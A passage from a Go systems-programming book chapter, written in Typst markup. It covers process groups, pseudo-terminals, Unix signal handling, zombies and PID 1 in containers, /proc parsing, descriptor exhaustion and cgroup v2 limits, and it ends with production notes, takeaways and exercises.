comes when the background process exits. `TestWaitDoesNotHangOnInheritedPipes`
reproduces it with a grandchild that sleeps for a minute: `Output` returns
after `WaitDelay` with `exec.ErrWaitDelay`, and the group kill removes the
grandchild.

=== Groups and terminals

Process groups also drive job control, and there is a side effect you need
to know about. When you press #kbd("Ctrl-C"), the terminal sends `SIGINT`
to its _foreground_ process group. A child in its own group no longer
receives it. With `procx`, #kbd("Ctrl-C") reaches only the tool, and the
tool turns it into a context cancellation (with `lifecycle.NotifyContext`
from Chapter 4), which `procx` turns into `SIGTERM` for the group. That is
usually what you want: one orderly shutdown instead of every process
reacting to the keypress on its own. Other signals that matter to the
child, such as `SIGHUP` for reloads or `SIGWINCH` for window resizes, have
to be passed on explicitly. `Cmd.Forward(sigs...)` does that: it
subscribes to the signals with `signal.Notify` and relays each one to the
group until its `stop` function is called, and
`TestForwardRelaysSignals` checks it end to end.

An interactive child (an editor, `kubectl exec -it`, a password prompt)
is the exception: it must stay in the terminal's foreground group,
because a background group that reads from the terminal is stopped with
`SIGTTIN`. Run it in your own group, or give it a pseudo-terminal
(@sec-os-pty).

#production(title: [When process groups are not enough])[
  A process can leave its group with `setsid` or `setpgid`, and daemons do
  exactly that. For a hard guarantee, put the command in its own cgroup:
  every descendant stays in the cgroup whatever it does, and since Linux
  5.14 writing `1` to the cgroup's `cgroup.kill` file kills all of them at
  once. systemd stops services this way, and `SysProcAttr.UseCgroupFD`
  (Go 1.20) starts a child directly in a cgroup you created. Go 1.26 added
  `Process.WithHandle`, which exposes the pidfd for code that needs to pass
  it to other system calls.
]

== When the child needs a terminal <sec-os-pty>

Many programs behave differently when their output is a terminal. They
print colour, redraw progress bars with `\r`, prompt for input, and use
line-buffered output; piped into another program, they print plain text,
skip prompts, and buffer output in large blocks. C's standard library makes
that last switch automatically, which is why `python script.py | tee log`
appears to hang until the script exits. A tool that wraps another tool,
such as a deploy CLI running `terraform apply` and showing its progress,
gets the pipe behaviour unless it does something about it.

The check programs use is `isatty`, which asks the kernel for the terminal
attributes of a descriptor. Only a terminal has them:

#code(file: "examples/ch05/ttydemo/term_linux.go")[```go
_, err := unix.IoctlGetTermios(int(f.Fd()), unix.TCGETS) // TIOCGETA on macOS
return err == nil // ENOTTY for pipes, files and /dev/null
```]

The tempting shortcut, `fi.Mode()&os.ModeCharDevice != 0`, is wrong:
`/dev/null` is a character device too, so a program run with output
discarded would decide a person is watching. Chapter 9 covers terminal
detection, `NO_COLOR` and output design in depth.

A _pseudo-terminal_ (PTY) is a pair of devices: the child gets the
terminal side as its stdin, stdout and stderr, and the parent reads and
writes the other side. To the child it is indistinguishable from a real
terminal. `github.com/creack/pty` wraps the details; `pty.StartWithSize`
opens the pair, starts the command in a new session with the PTY as its
controlling terminal, and returns the parent's side. The demo's child
behaves like a typical CLI: if `isTerminal(os.Stdout)` is false it prints
two plain lines; otherwise it prints the terminal size, redraws a progress
line with `\r`, and finishes in green. The parent runs it twice:

#src("examples/ch05/ttydemo/main.go", region: "run")

#output("ch05/ttydemo.txt", cmd: "docker run --rm pgo-ch05 /ttydemo")

Through the pipe the child saw no terminal and printed two plain lines.
Through the PTY it saw a 120 by 40 terminal, redrew its progress line
three times with carriage returns, and printed in green. Look at the line
endings as well: the program wrote `\n`, and the parent received `\r\n`.
The PTY's line discipline translates newlines (the `ONLCR` flag), as a real
terminal would. Two more differences from a pipe trip people up. When the
child exits, reading the parent side returns `EIO` on Linux rather than
`io.EOF`, so the code above treats `EIO` as the end. And `pty.Start` sets
`Setsid` and `Setctty`, which puts the child in a new session and group,
so `procx`'s `Setpgid` must not be combined with it; signal the session
leader's group instead.

#warning(title: [Do not scrape a PTY])[
  A PTY makes a child think a human is watching, so its output is designed
  for humans: escape codes, redraws, wrapped lines, spinners. Use a PTY to
  _relay_ output to a user (and copy the user's terminal size to it with
  `pty.Setsize`, re-sending on `SIGWINCH`). When your code needs to parse
  the output, ask the tool for a machine format instead: `--output json`,
  `--porcelain`, `--no-color`, or `NO_COLOR=1`.
]

== Signals beyond #kbd("Ctrl-C") <sec-os-signals>

Chapter 4 built `lifecycle.NotifyContext` for the two signals that mean
"stop": `SIGINT` and `SIGTERM`, with a second signal forcing the exit. A
few more signals shape how platform tools behave.

#table(
  columns: (auto, auto, 1fr),
  table.header([Signal], [Default], [What it means for a Go tool]),
  [`SIGINT`, `SIGTERM`], [terminate], [Stop soon. Handle with `lifecycle.NotifyContext`.],
  [`SIGHUP`], [terminate], [The terminal went away; for daemons, by convention, "reload your config".],
  [`SIGQUIT`], [core dump], [The Go runtime prints every goroutine's stack and exits (Chapter 4).],
  [`SIGPIPE`], [terminate], [The reader of a pipe has gone. Go's handling depends on the descriptor; see below.],
  [`SIGCHLD`], [ignore], [A child changed state. `os/exec` waits for its own children; orphans are PID 1's problem.],
  [`SIGWINCH`], [ignore], [The terminal was resized. Forward it to a child on a PTY.],
  [`SIGKILL`, `SIGSTOP`], [kill, stop], [Cannot be caught, blocked or ignored. Nothing in your process runs.],
)

=== SIGPIPE

When a process writes to a pipe whose reader has exited, the kernel sends
it `SIGPIPE`, whose default action is to terminate. That default is what
makes `producer | head -n 3` stop the producer instead of letting it run
forever. Go keeps the behaviour where it is useful and avoids it where it
is not: a write to a broken pipe on descriptor 1 or 2 kills the program
with `SIGPIPE`, while on any other descriptor, such as a network
connection, the write just fails with `EPIPE`. A server must not die
because one client disconnected.

There is a catch. If any code in the program calls `signal.Notify` for
`SIGPIPE`, including code in a dependency, the special case for stdout and
stderr is off, and writes there fail with `EPIPE` too. A loop that ignores
write errors then never ends:

#src("examples/ch05/sigpipe/main.go", region: "loop")

#output("ch05/sigpipe.txt")

The first run is the default: three lines, then death by `SIGPIPE`,
status 141 (128 + 13), which shells treat as normal for a pipeline. The
second subscribed to `SIGPIPE` and ignored errors, and was still spinning
after a million failed writes; without the demo's cut-off it would burn a
CPU until someone noticed. The third checks the error and exits 0. The
rule for CLIs: check the error from every write to stdout, and treat
`EPIPE` as "the reader is done", not as a failure.

=== SIGHUP and live reloads

`SIGHUP` originally meant "the modem hung up". Daemons have no terminal,
so the signal was free, and the convention became "re-read your
configuration": nginx, Prometheus and sshd all reload on it.
Combined with atomic writes, it gives a config deploy with no restart and
no window in which the service runs without a valid config. `reload`
loads and validates its config at startup, stores it in an
`atomic.Pointer[Config]`, sets up `lifecycle.NotifyContext`, and then
waits:

#src("examples/ch05/reload/main.go", region: "run")

A full session, with `atomicput` doing the deploys:

#output("ch05/reload.txt")

The design choices are the important part. A bad config at startup is
fatal, because there is nothing to fall back to; a bad config at reload is
logged and ignored, because there is. The new config is fully parsed and
validated before it replaces the old one, and the swap is a single
`atomic.Pointer` store, so request handlers see one config or the other.
The `SIGHUP` channel has a buffer of one: if three reload signals arrive
while a reload is running, they collapse into one more reload, which is
what you want. And `SIGTERM` still goes through `lifecycle`, so the two
mechanisms compose.

#warning(title: [`SIGHUP` kills by default])[
  If the signal arrives before `signal.Notify` runs, or the binary has no
  handler at all, the default action terminates the process. That makes
  "send SIGHUP to reload" dangerous across a fleet where some instances run
  an old binary without the handler. Register the handler first thing in
  `main`, and have deploy tooling check the version before signalling.
]

=== SIGCHLD, zombies and PID 1

When a process exits, the kernel keeps a small record of it, its exit
status and resource usage, until the parent collects it with `wait`. In
between, the process is a _zombie_: state `Z`, no memory, no running code,
but still a slot in the process table and a PID. `os/exec` always waits
for the children it starts. The problem is the children it did not start.

When a process dies, its children are re-parented to PID 1 (or to the
nearest ancestor marked as a _subreaper_). On a normal Linux system PID 1
is `systemd` or another init, which reaps everything it inherits. In a
container, PID 1 is whatever the image's entrypoint is, very often your Go
binary. `zombies` runs a child that starts three short jobs and exits
without waiting for them:

#session(
  ("docker run --rm pgo-ch05 /zombies", "ch05/zombies.txt"),
  ("docker run --rm --init pgo-ch05 /zombies", "ch05/zombies-init.txt"),
)

As PID 1, the Go program inherited the three jobs, never waited for them,
and they stayed as zombies. Each holds a PID; with a `pids.max` of a few
hundred, typical for a pod, a long-running agent that calls scripts which
background things will eventually be unable to start anything at all.
With `--init`, Docker runs its bundled `docker-init` (which is `tini`) as
PID 1. It reaps every orphan, forwards signals to your program, and exits
with its exit status. That is the whole job of `tini`, and why it exists.

#internals(title: [Why not reap in Go?])[
  A Go PID 1 can reap orphans itself: subscribe to `SIGCHLD` and call
  `wait4(-1, ..., WNOHANG)` in a loop. The trouble is that `wait4(-1)`
  reaps _any_ child, including the ones `os/exec` is about to `Wait` for,
  which then fail with `ECHILD` and lose their exit status. Doing it
  correctly means peeking with `waitid(..., WNOWAIT)` and only reaping PIDs
  you did not start. Unless you are writing an init system, use `tini`:
  `docker run --init`, `ENTRYPOINT ["/tini", "--", "/app"]`, or in
  Kubernetes `shareProcessNamespace: true`, which makes the pod's `pause`
  container PID 1, and `pause` reaps zombies.
]

PID 1 is special in a second way: the kernel does not apply a signal's
default action to it, so a C program with no `SIGTERM` handler running as
PID 1 ignores `docker stop`, which waits ten seconds and sends `SIGKILL`.
A Go binary still exits, because the runtime installs handlers for all
signals and, when re-raising an unhandled `SIGTERM` has no effect, exits
with status 143 (its source comments: "this probably means we're PID
1"). Deferred cleanup does not run either way, so handle `SIGTERM`
explicitly, as Chapter 4 does.

== Reading the kernel's view: `/proc` and cgroups <sec-os-proc>

Linux exposes almost everything it knows about a process as text files
under `/proc`. For tools, a handful matter:

#table(
  columns: (auto, 1fr),
  table.header([File], [What it gives you]),
  [`/proc/self/status`], [Human-readable summary: `VmRSS` (resident memory now), `VmHWM` (peak), `Threads`, `FDSize`, signal masks, capabilities.],
  [`/proc/<pid>/stat`], [One line, space-separated: state, parent, process group, session, CPU times, start time, RSS. What `ps` and `top` read.],
  [`/proc/<pid>/fd/`], [One symlink per open descriptor, pointing at the file, socket or pipe. Counting them finds descriptor leaks.],
  [`/proc/<pid>/cmdline`, `environ`], [Arguments and environment, NUL-separated. `environ` is how secrets passed as environment variables leak to anyone who can read it.],
)

The `stat` line looks easy to parse and is a favourite interview question
because it is not. The second field is the executable name in parentheses,
and a process can set its own name to anything up to 15 bytes, including
spaces and `)`. Splitting on spaces is wrong, and so is splitting at the
first `)`. The only safe point is the _last_ `)` on the line:

#src("pkg/sysinfo/proc.go", region: "stat")

`StartTime` deserves a note: it is the process's start time in clock ticks
since boot, and the pair (PID, start time) identifies a process uniquely,
which is what a pid file needs to detect PID reuse (@sec-os-lock). The
`orphans` and `zombies` demos used `sysinfo.Processes` to print their
tables, because a `FROM scratch` image has no `ps`.

=== File descriptor exhaustion

Every open file, socket, pipe and epoll instance uses a descriptor, and
`RLIMIT_NOFILE` caps how many a process may hold. Leak one per request (a
response body not closed, a file opened in a loop with `defer` that runs
only at function exit) and the process fails when the counter hits the
limit. `limits -exhaust-fds` opens `/proc/self/status` in a loop without
closing it:

#output("ch05/limits-fds.txt", cmd: "docker run --rm --ulimit nofile=256:256 pgo-ch05 /limits -exhaust-fds")

250, not 256: stdin, stdout and stderr use three, and the Go runtime holds
the other three: the cgroup `cpu.max` file it keeps open to notice CPU
limit changes (Go 1.25), and the epoll instance and wake-up descriptor of
its network poller. `EMFILE` then appears wherever the next
descriptor is needed, often far from the leak: in `net/http`, `Accept`
fails, and the server logs "http: Accept error: ... too many open files"
and retries after 5 ms, doubling up to a second, while existing
connections carry on. Watch the descriptor count (`/proc/<pid>/fd`, or the
`process_open_fds` metric from the Prometheus client) as a leading
indicator.

#newingo("1.19", title: [Go raises its own descriptor limit])[
  Many systems set a soft `RLIMIT_NOFILE` of 1024 for compatibility with
  `select(2)`, which Go never uses. Since Go 1.19, any program that imports
  `os` raises its soft limit to the hard limit at startup (current
  releases set it one below the hard limit, to detect a later `prlimit`
  from outside). When the program starts a child, the runtime restores the
  original soft limit in the child, so old C programs still get the value
  they expect. The second `limits` run below shows the effect: Docker set
  1024 soft and 4096 hard, and the Go process reports 4095.
]

=== cgroup v2

Containers are not a kernel feature; they are a combination of namespaces
(what a process can see) and control groups (what it can use). cgroup v2
arranges processes in one tree, mounted at `/sys/fs/cgroup`, and each
directory in the tree has files for the controllers enabled on it:

#table(
  columns: (auto, 1fr),
  table.header([File], [Meaning]),
  [`memory.max`], [Hard limit in bytes, or `max`. Exceeding it after reclaim fails triggers the OOM killer inside the group. This is Kubernetes' memory _limit_.],
  [`memory.high`], [Throttling threshold: above it, the group's allocations are slowed and reclaimed aggressively, but nothing is killed.],
  [`memory.current`, `memory.peak`], [Current usage, page cache included, and the high-water mark (`memory.peak` needs Linux 5.19).],
  [`cpu.max`], [`$QUOTA $PERIOD` in microseconds: `150000 100000` allows 1.5 CPUs of time per 100 ms period. This is the CPU _limit_; requests become `cpu.weight`.],
  [`pids.max`, `pids.current`], [Maximum number of tasks (processes and threads) in the group.],
)

#fig(placement: auto, caption: [The cgroup v2 path of a Kubernetes container (systemd cgroup driver). A limit on any directory along the path applies; inside its cgroup namespace, the container sees its own directory as the root.])[
  #diagram(
    spacing: (22pt, 8pt),
    dnode((0, 0), [`/sys/fs/cgroup`], kind: "muted"),
    dnode((0, 1), [`kubepods.slice`], kind: "default"),
    dnode((0, 2), [`kubepods-burstable.slice`], kind: "default"),
    dnode((0, 3), [`kubepods-burstable-pod<uid>.slice`], kind: "default"),
    dnode((0, 4), [`cri-containerd-<id>.scope`], kind: "accent"),
    dnode((1, 1), [node allocatable: all pods together], kind: "muted"),
    dnode((1, 2), [QoS class], kind: "muted"),
    dnode((1, 3), [pod: sum of its containers' limits], kind: "muted"),
    dnode((1, 4), [container: `memory.max`, `cpu.max`\ seen as `/` from inside], kind: "good"),
    dedge((0, 0), (0, 1), "-|>"),
    dedge((0, 1), (0, 2), "-|>"),
    dedge((0, 2), (0, 3), "-|>"),
    dedge((0, 3), (0, 4), "-|>"),
    dedge((0, 1), (1, 1), "--"),
    dedge((0, 2), (1, 2), "--"),
    dedge((0, 3), (1, 3), "--"),
    dedge((0, 4), (1, 4), "--"),
  )
] <fig-os-cgroup>

`sysinfo.ReadCgroup` returns a `Cgroup` struct with one field per file in
the table. It finds the process's group from `/proc/self/cgroup` (a line
`0::/path` on cgroup v2), reads usage from that directory, and walks up to
the root taking the tightest limit, because a limit on any ancestor
applies:

#src("pkg/sysinfo/cgroup.go", region: "cgroup")

Since the reader takes an `fs.FS`, the tests describe a container, a
systemd slice with a tighter parent limit, and a cgroup v1 host as
`fstest.MapFS` literals of a dozen lines each, and run on macOS.

`limits` puts it together. Without any limits, a container sees the
Docker VM's 10 CPUs and no memory ceiling:

#output("ch05/limits-none.txt", cmd: "docker run --rm pgo-ch05 /limits")

With limits on CPU, memory, PIDs and descriptors:

#output("ch05/limits-set.txt", cmd: "docker run --rm --cpus=1.5 --memory=256m --pids-limit=100 --ulimit nofile=1024:4096 \\\n    pgo-ch05 /limits")

Read the two runs together. `runtime.NumCPU` is 10 both times: it counts
the CPUs the process may be scheduled on, and a CPU limit is a time budget,
not a set of CPUs. `GOMAXPROCS` dropped from 10 to 2, which is the Go 1.25
container awareness from Chapter 4 at work: 1.5 CPUs of quota, rounded up
to a whole number of Ps. And `GOMEMLIMIT` is unlimited in both runs. The
runtime adapts its parallelism to the container but not its memory
target. A Go service in a 256 MiB container, by default, does not start
collecting harder as it approaches 256 MiB, because it does not know the
number exists.

=== Making a tool container-aware

The fix is a few lines at startup. Read `memory.max`, and if the operator
has not set `GOMEMLIMIT` explicitly, set the Go memory limit somewhat below
it:

#src("examples/ch05/limits/main.go", region: "memlimit")

#output("ch05/limits-memlimit.txt", cmd: "docker run --rm --cpus=1.5 --memory=256m pgo-ch05 /limits -set-memlimit \\\n    | grep -E '^(memory.max|GOMAXPROCS|GOMEMLIMIT)'")

Ten percent headroom is a starting point, not a law. Memory the Go runtime
does not manage (cgo allocations, thread stacks, the binary's mapped text)
and kernel memory charged to the cgroup (socket buffers, page cache for
files the process writes) all count against `memory.max`. Services with
large off-heap usage need more headroom. In Kubernetes there is also a
declarative route that needs no code:

#code(file: "deployment.yaml")[```yaml
env:
  - name: GOMEMLIMIT          # the runtime reads it at startup
    valueFrom:
      resourceFieldRef:
        resource: limits.memory
        divisor: "1"           # bytes; GOMEMLIMIT accepts a plain number
```]

That sets the limit to 100 percent of the container limit, which leaves no
headroom, so the code approach (or a hard-coded value per Deployment) is
better for services close to their limit. Either way, remember what
`GOMEMLIMIT` cannot do, which the `ReadAll` run showed: it makes the
collector work harder, but it cannot free memory that is still in use.

#interview(title: [“How does a container limit memory?”])[
  The runtime (runc, under containerd or Docker) creates a cgroup for the
  container and writes the limit to `memory.max`. Every page the
  container's processes touch is charged to it: heap, stacks, page cache
  for files they read and write, some kernel memory. When a charge would
  exceed the limit, the kernel reclaims first (clean page cache, swap if
  allowed) and, if that fails, runs the OOM killer _within the cgroup_,
  which sends `SIGKILL`, usually to the largest process. Kubernetes sees
  exit code 137 and reports `OOMKilled`. Then connect it to Go: no warning
  and no cleanup, `GOMEMLIMIT` makes the collector work harder but cannot
  shrink live data, and `memory.high` throttles instead of killing. For
  CPU, mention `cpu.max`, CFS throttling and `GOMAXPROCS`.
]

== Production notes <sec-os-production>

*Descriptor exhaustion.* Alert on open descriptors as a fraction of the
limit, not on errors: by the time `EMFILE` appears in logs, requests are
already failing. The usual causes in Go are unclosed response bodies (the
`bodyclose` linter in this repository catches most), `defer f.Close()`
inside a loop, and connections with no idle timeout.

*Zombies and PID limits.* Any container that runs other programs needs an
init. On a node with 5,000 containers, the few that leak zombies do not
show up in CPU or memory graphs; they show up as "fork: Resource
temporarily unavailable" once `pids.max` is reached. Graph `pids.current`
next to memory.

*Atomic config deploys.* Write the new version beside the old, `fsync`,
rename, `fsync` the directory, validate in the service, swap atomically
in memory, and keep serving the old config if the new one is bad. Roll
config out in waves like code, because a config that parses everywhere
can still be wrong everywhere.

*Subprocess hygiene.* Every command a tool runs needs a context, its own
process group, a grace period and a bound on its output. With 200
engineers, someone will wrap `terraform` in a script that backgrounds a
watcher; the group kill is the defence that does not depend on reviewing
their script.

*Linux in tests.* `pkg/sysinfo`'s parsing is tested on every OS through
`fstest.MapFS`; the real `/proc` and cgroup tests carry a `linux` build
tag and run in CI on Ubuntu. They were also cross-compiled and run in the
same `FROM scratch` image as the demos:

#output("ch05/linux-tests.txt", title: "go test -c for linux/arm64, run with docker run --init")
#output("ch05/test-race.txt", cmd: "go test -race ./pkg/fsx ./pkg/procx ./pkg/sysinfo ./examples/ch05/logscan")

#takeaways(
  [Bound every input you do not control. `io.ReadAll` on a file, a response body or a subprocess's output is a memory limit waiting to be found, and the OOM killer leaves no error message.],
  [`bufio.Scanner` stops at a token over its buffer size and `Scan` returns `false` as if at EOF. Always check `Err`; for untrusted input, read with `ReadSlice` and truncate long lines.],
  [Write file code against `fs.FS` and test it with `fstest.MapFS`. Use `os.Root` (Go 1.24, completed in 1.25) for any path that comes from outside, and refuse symlinks that leave the tree.],
  [Atomic replacement is six steps: temp file in the same directory, write, chmod, fsync, rename, fsync the directory. Each one prevents a specific failure.],
  [Use `flock` for single-instance tools: the kernel releases it when the holder dies, so it cannot go stale. Never delete the lock file on unlock.],
  [Run commands without a shell, in their own process group, with `Cancel` sending `SIGTERM` to the group and `WaitDelay` bounding the wait. Kill what is left of the group when the leader exits.],
  [A Go `SIGPIPE` on stdout kills the program unless someone called `signal.Notify` for it; then write errors must be checked. `SIGHUP` reloads should validate, then swap atomically.],
  [A container's PID 1 must reap orphans. Use `--init`, `tini` or `shareProcessNamespace`. Go adapts `GOMAXPROCS` to `cpu.max`, but sets no `GOMEMLIMIT` from `memory.max` unless you do.],
)

#exercises(
  [*Parallel logscan.* Make `scanFS` scan files concurrently with `conc.Stream` from Chapter 4, bounded by `-j`. Measure throughput and peak RSS on 20 rotated, gzipped logs with `-j 1`, `-j 4` and `-j 16`. Where does the speed-up stop, and why?],
  [*A staged directory install.* Write `fsx.InstallDir(src fs.FS, dst string)` that copies a tree into a temporary sibling directory and swaps it into place with `rename`, so a reader of `dst` never sees a half-installed tree. Directories cannot be renamed over non-empty directories on Linux: use a symlink that you `rename` over, as the kubelet does with `..data`, and test the swap with concurrent readers.],
  [*Stale pid files done properly.* Extend `lockdemo -pidfile` to record the PID _and_ the start time from `/proc/<pid>/stat`, and to treat the file as stale only if no process with that PID and start time exists. Write a test on Linux that proves a reused PID is not mistaken for the original holder. Then explain why this still is not as good as `flock`.],
  [*A supervisor.* Build `supervise -- CMD ARGS...` on `procx`: run the command in its own group, forward `SIGHUP`, `SIGUSR1` and `SIGWINCH`, turn the first `SIGINT` or `SIGTERM` into a graceful group stop with a `--grace` flag, restart the command with backoff when it exits non-zero, and exit with the child's status (128 + n for signals). Test it with the helper-process pattern from `procx_test.go`.],
  [*An automemlimit package.* Turn `memLimitFor` into `pkg/sysinfo.SetMemoryLimit(ratio float64)`, called from `main`, that respects an explicit `GOMEMLIMIT`, handles cgroup v1 hosts by doing nothing, and logs what it decided. Add a `memory.high` rule: if it is set and lower than `memory.max`, base the limit on it. Write the tests with `fstest.MapFS`.],
)
